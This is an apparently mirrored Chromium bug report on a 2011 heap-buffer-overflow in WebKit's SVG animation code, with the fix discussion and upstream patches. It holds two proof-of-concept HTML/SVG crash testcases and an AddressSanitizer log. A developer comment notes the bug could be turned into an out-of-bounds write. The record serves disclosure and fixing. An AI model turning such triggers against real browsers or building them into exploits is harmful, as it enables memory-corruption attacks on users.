# Heap-buffer-overflow in WebCore::SVGLength::valueAsString

| Field | Value |
|-------|-------|
| **Issue ID** | [40052249](https://issues.chromium.org/issues/40052249) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P1 |
| **Component** | Blink, Blink>SVG |
| **Reporter** | ax...@gmail.com |
| **Assignee** | sc...@chromium.org |
| **Created** | 2011-12-19 |
| **Bounty** | $1,000.00 |

## Description

**VULNERABILITY DETAILS**  

Heap buffer overflow can be triggered while building SVG animated element length.

**VERSION**  

18.0.974.0 (Developer Build 114913 Linux)  

Crashes also on Windows 7, 16.0.912.63 m, but not under debugger.  

Can't crash under Linux 16.0.912.63, it's behavior is weird - doesn't load second time. However, first crash was caught in this version.

**REPRODUCTION CASE**

<html>
<head>
<script>
function go() {
c = 0;
q = document.getElementById('root').contentDocument;
s = q.getElementById('s');
a = q.getElementById('a');
setInterval(
function crash() {
if (c==0) s.id = 'x';
if (c==1) s.appendChild( a.cloneNode(0) );
if (c==2) setTimeout("s.id='b'", 1);
c++;
}, 1
);
}
</script>
</head>
<body>
<object data="f.svg" id="root" onload="go()"/></object>
</body>
</html>

--- f.svg ---

<svg id="s" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
<text id="x"></text>
<animate xlink:href="#x" id="a" attributeName="y" from="1" to="2" dur="1s"/>
</svg>

**FOR CRASHES, PLEASE INCLUDE THE FOLLOWING ADDITIONAL INFORMATION**  

==32190== ERROR: AddressSanitizer heap-buffer-overflow on address 0x7f19005e1400 at pc 0x7f1939a4e2d5 bp 0x7fff62d57750 sp 0x7fff62d57748  

READ of size 4 at 0x7f19005e1400 thread T0  

#0 0x7f1939a4e2d5 in WebCore::SVGLength::valueAsString() const /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/WebCore/svg/SVGLength.cpp:252  

#1 0x7f1939b40568 in WebCore::SVGLengthList::valueAsString() const /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/WebCore/svg/SVGLengthList.cpp:66  

#2 0x7f1939b3c7a5 in WebCore::SVGAnimatedType::valueAsString() /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/WebCore/svg/SVGAnimatedType.cpp:312  

#3 0x7f19399d2ee5 in WebCore::SVGAnimateElement::applyResultsToTarget() /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/WebCore/svg/SVGAnimateElement.cpp:233  

#4 0x7f1939accadf in WebCore::SMILTimeContainer::updateAnimations(WebCore::SMILTime, double, WTF::String const&) /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/WebCore/svg/animation/SMILTimeContainer.cpp:297  

#5 0x7f1939acb918 in ~RefPtr /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/JavaScriptCore/wtf/RefPtr.h:58  

#6 0x7f193899235a in WebCore::ThreadTimers::sharedTimerFiredInternal() /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/WebCore/platform/ThreadTimers.cpp:118  

0x7f19005e1400 is located 0 bytes to the right of 128-byte region [0x7f19005e1380,0x7f19005e1400)  

allocated by thread T0 here:  

#0 0x7f193b174414 in malloc ??:0  

#1 0x7f193838db66 in WTF::fastMalloc(unsigned long) /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/JavaScriptCore/wtf/FastMalloc.cpp:268  

#2 0x7f1938d3b189 in WTF::Vector<WebCore::SVGLength, 0ul>::expandCapacity(unsigned long, WebCore::SVGLength const\*) /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/JavaScriptCore/wtf/Vector.h:786  

#3 0x7f19399dec25 in WebCore::SVGAnimationElement::updateAnimation(float, unsigned int, WebCore::SVGSMILElement\*) /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/WebCore/svg/SVGAnimationElement.cpp:624  

#4 0x7f1939adc8d2 in WebCore::SVGSMILElement::progress(WebCore::SMILTime, WebCore::SVGSMILElement\*) /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/WebCore/svg/animation/SVGSMILElement.cpp:947  

#5 0x7f1939acc782 in WebCore::SMILTimeContainer::updateAnimations(WebCore::SMILTime, double, WTF::String const&) /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/WebCore/svg/animation/SMILTimeContainer.cpp:277  

#6 0x7f1939acb918 in ~RefPtr /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/JavaScriptCore/wtf/RefPtr.h:58  

#7 0x7f193899235a in WebCore::ThreadTimers::sharedTimerFiredInternal() /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/WebCore/platform/ThreadTimers.cpp:118  

==32190== ABORTING  

Stats: 30M malloced (25M for red zones) by 61515 calls  

Stats: 1M realloced by 1131 calls  

Stats: 24M freed by 47396 calls  

Stats: 0M really freed by 0 calls  

Stats: 84M (21518 full pages) mmaped in 21 calls  

mmaps by size class: 8:65532; 9:8191; 10:4095; 11:2047; 12:1024; 13:1024; 14:256; 15:256; 16:64; 17:64; 18:16; 19:8; 21:4; 22:1;  

mallocs by size class: 8:49099; 9:6324; 10:3288; 11:1202; 12:344; 13:911; 14:130; 15:148; 16:23; 17:36; 18:1; 19:4; 21:4; 22:1;  

frees by size class: 8:36909; 9:5277; 10:2960; 11:846; 12:238; 13:872; 14:110; 15:139; 16:16; 17:20; 18:1; 19:4; 21:4;  

rfrees by size class:  

Stats: malloc large: 46 small slow: 312  

Shadow byte and word:  

0x1fe3200bc280: fa  

0x1fe3200bc280: fa fa fa fa fa fa fa fa  

More shadow bytes:  

0x1fe3200bc260: fa fa fa fa fa fa fa fa  

0x1fe3200bc268: fa fa fa fa fa fa fa fa  

0x1fe3200bc270: 00 00 00 00 00 00 00 00  

0x1fe3200bc278: 00 00 00 00 00 00 00 00  

=>0x1fe3200bc280: fa fa fa fa fa fa fa fa  

0x1fe3200bc288: fa fa fa fa fa fa fa fa  

0x1fe3200bc290: fd fd fd fd fd fd fd fd  

0x1fe3200bc298: fd fd fd fd fd fd fd fd  

0x1fe3200bc2a0: fa fa fa fa fa fa fa fa

## Timeline

### ts...@chromium.org (2011-12-19)

[Empty comment from Monorail migration]

### in...@chromium.org (2011-12-19)

Detailed report: https://cluster-fuzz.appspot.com/testcase?key=9200480

Uploader: inferno@chromium.org

Crash Type: Heap-buffer-overflow READ 4
Crash Address: 0x7fd4218a6900
Crash State:
  - crash stack -
  WebCore::SVGLength::valueAsString
  WebCore::SVGLengthList::valueAsString
  WebCore::SVGAnimatedType::valueAsString
  

Minimized Testcase (0.57 Kb): https://cluster-fuzz.appspot.com/download/AMIfv94O2DmB5Zg9W5A-s5JVtNd5Kylelv28L-32t1eJbQwqODRwYctIN7x5hSnLpj09OK2WPFG4IrII-n67cD_qCrNrLNnIt5YAo9H9NA-Qes-MzhNfwA3RZdvi_3Mc8e-0oaXu6bQFDjHz_YS-CO8ldHd5G43RwA

### in...@chromium.org (2011-12-19)

[Empty comment from Monorail migration]

### sc...@gmail.com (2011-12-19)

From the ASAN log:
---
ASAN:SIGSEGV
==24989== ERROR: AddressSanitizer crashed on unknown address 0x0000bbadbeef (pc 0x7fb6be616941 sp 0x7fb67a8f0740 bp 0x7fb67a8f0a90 ax 0x0000bbadbeef T15)
---

Isn't 0xbbadbeef a WebKit ASSERT? I wonder what it does in a release ASAN build?

### in...@chromium.org (2011-12-19)

Chris, the report has both release and debug build stacks (release stack after the debug stack). on debug, it crashes on the assert and on release, it crashes on heap-buffer-overflow.

### sc...@gmail.com (2011-12-19)

Oh, well isn't that just epic :)

### js...@chromium.org (2011-12-19)

Yeah. It's misinterpreting a user-supplied numeric value as a length value. So, very bad--probably high severity but I have to verify that a write or call is possible after the read. Shouldn't be a difficult fix, but I have to figure out where it goes.

### js...@chromium.org (2011-12-20)

Still trying to figure out the right spot to catch this, but here's a simpler (single file) repro:

<svg id="s">
  <text id="x"></text>
  <animate xlink:href="#x" id="a" attributeName="y" from="0" to="1" dur="1s" repeatCount="indefinite">
</svg>
<script>
setTimeout(function() {
    s = document.getElementById('s')
    s.id = 'x'
    s.appendChild(document.getElementById('a').cloneNode())
    setTimeout(function () { s.id='b' }, 0)
}, 0)
</script>


### js...@chromium.org (2011-12-21)

Adam, please try the repro from https://crbug.com/chromium/108037#c8. You may need to wait 10 seconds and reload.

### js...@chromium.org (2011-12-22)

Reported upstream: https://bugs.webkit.org/show_bug.cgi?id=75096

I'll be uploading a patch shortly, and I've upped the severity because you can turn it into an OOB write/execute.

### in...@chromium.org (2012-01-23)

The last M16 patch is already gone. Mass-updating all of these to M17

### js...@chromium.org (2012-02-05)

[Empty comment from Monorail migration]

### sc...@chromium.org (2012-02-06)

Could someone please add me (schenney ... chromium.org) to the WebKit bug so I can see it and track progress and nudge reviewers if needed.

### in...@chromium.org (2012-02-06)

done!

### sc...@chromium.org (2012-02-09)

[Empty comment from Monorail migration]

### js...@chromium.org (2012-02-09)

Thanks for grabbing this. I'm heads down on the Flash sandbox right now and haven't had time to circle back to it.

To add some context, Niko's suggestion upstream about where to move the checks is a bad idea. However, the patch I submitted probably wasn't entirely right either. It catches the bad animate element before use, but you can probably do better by preventing the bad animate from getting created when the node is cloned.

### sc...@chromium.org (2012-02-15)

Patch up: https://bugs.webkit.org/show_bug.cgi?id=75096

### sc...@chromium.org (2012-02-15)

[Empty comment from Monorail migration]

### sc...@chromium.org (2012-02-20)

Committed WebKit r108134: <http://trac.webkit.org/changeset/108134>

Security team will need to merge this into earlier branches as I do not have committer status yet.

### js...@chromium.org (2012-02-20)

[Empty comment from Monorail migration]

### sc...@gmail.com (2012-03-01)

M17: http://trac.webkit.org/changeset/109358
M18: http://trac.webkit.org/changeset/109361

### sc...@gmail.com (2012-03-03)

@Ax330d: I'm sure you're not surprised about $1000 :)

----
Boilerplate text:
Please do NOT publicly disclose details until a fix has been released to all our
users. Early public disclosure may cancel the provisional reward.
Also, please be considerate about disclosure when the bug affects a core library
that may be used by other products.
Please do NOT share this information with third parties who are not directly
involved in fixing the bug. Doing so may cancel the provisional reward.
Please be honest if you have already disclosed anything publicly or to third parties.
----

### sc...@gmail.com (2012-03-03)

[Empty comment from Monorail migration]

### sc...@gmail.com (2012-03-21)

[Empty comment from Monorail migration]

### [Deleted User] (2012-05-15)

Marking old security bugs Fixed..

### bu...@chromium.org (2012-10-13)

This issue has been closed for some time. No one will pay attention to new comments.
If you are seeing this bug or have new data, please click New Issue to start a new bug.

### bu...@chromium.org (2013-03-10)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-13)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-13)

[Empty comment from Monorail migration]

### sc...@gmail.com (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-04-01)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-04-06)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-04-06)

[Empty comment from Monorail migration]

### sh...@chromium.org (2016-06-14)

[Empty comment from Monorail migration]

### sh...@chromium.org (2016-10-01)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### sh...@chromium.org (2016-10-02)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### mb...@chromium.org (2016-10-02)

[Empty comment from Monorail migration]

### aw...@chromium.org (2018-04-25)

[Empty comment from Monorail migration]

### is...@google.com (2018-04-25)

This issue was migrated from crbug.com/chromium/108037?no_tracker_redirect=1

[Multiple monorail components: Blink, Blink>SVG]
[Monorail mergedwith: crbug.com/chromium/113378]
[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40052249)*
